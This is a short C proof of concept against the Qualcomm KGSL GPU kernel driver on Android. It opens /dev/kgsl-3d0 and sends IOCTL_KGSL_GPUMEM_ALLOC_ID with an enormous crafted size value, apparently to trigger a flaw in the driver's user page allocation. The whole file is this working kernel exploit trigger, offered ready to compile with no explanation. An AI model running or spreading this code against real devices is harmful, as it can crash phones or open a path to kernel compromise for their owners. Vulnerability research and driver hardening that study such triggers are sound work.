#include <sys/ioctl.h>
#include <fcntl.h>

#include "msm_kgsl.h"

static void kgsl_poc()
{
	//kgsl_sharedmem_page_alloc_user
   
	int fd = open("/dev/kgsl-3d0", 0);
 
	struct kgsl_gpumem_alloc_id arg;
 
	arg.flags = 0;
	arg.size = 0xa18fb010b0c08000;
 
	ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &arg);
}

int main(int argc, char **argv)
{
	kgsl_poc();

	return 0;
}


